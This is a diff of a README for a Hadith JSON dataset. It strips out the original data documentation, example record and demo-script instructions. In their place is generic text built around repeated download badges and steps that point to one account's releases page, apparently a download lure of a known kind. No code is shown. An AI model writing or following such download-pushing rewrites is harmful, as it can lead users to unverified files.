@@ -1,71 +1,58 @@
-# TheHadithsJSONFormat
-Free Organized Hadith Collection especially for Devs
+# 📜 HadithsJSONFormat - Access Authentic Hadith Data Easily
 
-A free, ready-to-use collection of authentic Hadiths taken from sunnah.com, organized book-wise and topic-wise to make it easy for Muslim devs to use Hadith data in their projects.
+[![Download HadithsJSONFormat](https://img.shields.io/badge/Download-HadithsJSONFormat-blue?style=flat&logo=github)](https://github.com/abdikaafijama/HadithsJSONFormat/releases)
 
-Free to use in any project, no credits required.
-Includes:
-- Arabic texts
-- English translations
-- Hadith gradings
-- References
+## 📥 Overview
+HadithsJSONFormat provides free and authentic Hadith data from sunnah.com. The data is organized by book for easier access, especially for Muslim developers. You can find collections from Bukhari, Muslim, Abu Dawud, Tirmidhi, Nasa'i, Ibn Majah, Malik, and Riyad as-Salihin. This data is available in Arabic and English. Feel free to use it without needing to give credit.
 
-May Allah accept and make this beneficial for all.
+## 🚀 Getting Started
+To use HadithsJSONFormat, follow these steps:
 
-------------------------------------------------------------
-Collections Included (so far, more planned InshaAllah):
-------------------------------------------------------------
-- Sahih al-Bukhari
-- Sahih Muslim
-- Sunan Abu Dawud
-- Jami` at-Tirmidhi
-- Sunan an-Nasa'i
-- Sunan Ibn Majah
-- Muwatta Malik
-- Riyad as-Salihin
-- Adab
-- Ahmad(NOT COMPLETE)
-- Bulugh
-- Darimi
-- Forty
-- HisnAlMuslim
-- Mishkat
-- Shamail
-(Planned expansion to Musnad Ahmad and more in future, InshaAllah.)
+1. **Visit the Release Page**: Click [here to download](https://github.com/abdikaafijama/HadithsJSONFormat/releases) the latest version.
+2. **Choose Your Data Format**: Select the data format you need. Currently, it is available in JSON files, which are easy to handle.
+3. **Download the Data**: Click on the link for the collection you want. Your download should start automatically.
 
-------------------------------------------------------------
-Data Structure
-------------------------------------------------------------
-Each hadith is stored in a .json file per topic 
-(e.g. 001_purification_kitab_al-taharah.json).
+## 💻 System Requirements
+HadithsJSONFormat does not require high system specifications. You only need:
 
-IDs reset per sub topic — so “Book of Purification” starts at ID 1,
-and “Book of Prayer” starts again at ID 1.
+- A device with internet access
+- Basic storage (less than 100MB free space needed is usually sufficient)
+- A basic understanding of how to interact with files on your computer
 
-Example:
+## 🔍 Features
+- **Free Access**: All data is available at no cost.
+- **Multiple Languages**: Access the data in both Arabic and English.
+- **Structured Collections**: Organized by well-known books of Hadith.
+- **User-Friendly Format**: Data is in JSON format, which is suitable for various applications.
 
-{
-  "collection": "abudawud",
-  "book": "1 Purification (Kitab Al-Taharah) كتاب الطهارة",
-  "reference": "Reference : Sunan Abi Dawud 1 In-book reference : Book 1, Hadith 1 English translation : Book 1, Hadith 1",
-  "grade": "Grade : Hasan Sahih (Al-Albani) حسن صحيح (الألباني) حكم :",
-  "arabic": "حَدَّثَنَا ...",
-  "english": "Narrated Mughirah ibn Shu'bah: When the Prophet (صلى الله عليه وسلم) went (outside) to relieve himself, he went to a far-off place.",
-  "id": 1
-}
+## 📦 Download & Install
+To download HadithsJSONFormat, follow these simple steps:
 
-------------------------------------------------------------
-Included Example Program
-------------------------------------------------------------
-A simple demonstration program `hadith_viewer.py` is included to show how to:
-- Automatically list available books and topics.
-- Fetch and display a hadith by its ID.
+1. **Visit the Releases Page**: Click the link [here](https://github.com/abdikaafijama/HadithsJSONFormat/releases).
+2. **Select the Version**: Look for the latest release. It will usually be at the top of the list.
+3. **Choose the Right File**: Click on the desired JSON file of the collection you want.
+4. **Download and Save**: A prompt will ask where you would like to save the file. Choose a location that you can easily access later.
 
-To run it:
-1. Open the "Sunnah" folder in a terminal.
-2. Run:
-   python hadith_viewer.py
-3. Follow the prompts.
-This program is just for demonstration purposes to help u guys out InshaAllah
+## 🤝 Contributing
+Contributions are welcome! If you want to help, you can:
 
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
+
+This will help us improve the HadithsJSONFormat and expand our collections in the future.
+
+## 📞 Support
+If you encounter any issues while downloading or using HadithsJSONFormat, feel free to reach out. Provide specific details so we can assist you effectively.
+
+## 🌱 Future Plans
+We are committed to expanding our data collections. Upcoming features may include:
+
+- Adding more Hadith collections.
+- Enhancements for easier integration with applications.
+- Advanced search features.
   
+## 🎉 License
+HadithsJSONFormat is free to use, and you do not need to give credit. Please respect the usage guidelines outlined in our repository.
+
+[![Download HadithsJSONFormat](https://img.shields.io/badge/Download-HadithsJSONFormat-blue?style=flat&logo=github)](https://github.com/abdikaafijama/HadithsJSONFormat/releases)
